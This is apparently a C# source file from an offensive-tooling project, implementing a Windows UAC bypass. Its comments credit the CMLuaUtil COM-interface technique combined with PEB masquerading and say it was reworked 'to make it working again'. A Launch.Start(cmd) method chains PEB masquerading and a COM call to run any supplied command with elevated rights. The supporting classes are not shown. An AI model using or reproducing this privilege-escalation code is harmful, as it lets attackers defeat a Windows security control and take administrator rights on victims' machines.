/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

/*
|| AUTHOR : UAC bypass method from Oddvar Moe aka api0cradle. ||
            * ucmCMLuaUtilShellExecMethod
            *
            * Purpose:
            *
            * Bypass UAC using AutoElevated undocumented CMLuaUtil interface.
            * This function expects that supMasqueradeProcess was called on process initialization.
            *
|| Original C# version :  https://github.com/0xlane/BypassUAC ||
|| github : https://github.com/arsium       ||
|| This method combines PEB masquerading + abusing com object. Reworked imports in C# to make it working again :) ||
*/

/*
Cdecl : The caller cleans the stack. This enables calling functions with varargs, which makes it appropriate to use for methods that accept a variable number of parameters, such as Printf.
StdCall : The callee cleans the stack.
WinAPI : This member is not actually a calling convention, but instead uses the default platform calling convention. For example, on Windows x86 the default is StdCall and on Linux x86 it is Cdecl.
*/

namespace Special
{
    public static class Launch
    {
        public enum HRESULT : long
        {
            S_FALSE = 0x0001,
            S_OK = 0x0000,
            E_INVALIDARG = 0x80070057,
            E_OUTOFMEMORY = 0x8007000E
        }

        public static HRESULT Start(string cmd) 
        {
            ASM.PreparePebProc();
            DelegatesHandling.PrepareDelegate();
            PEB.MasqueradePEB();
            return COM.Start(cmd);
        }
    }
}
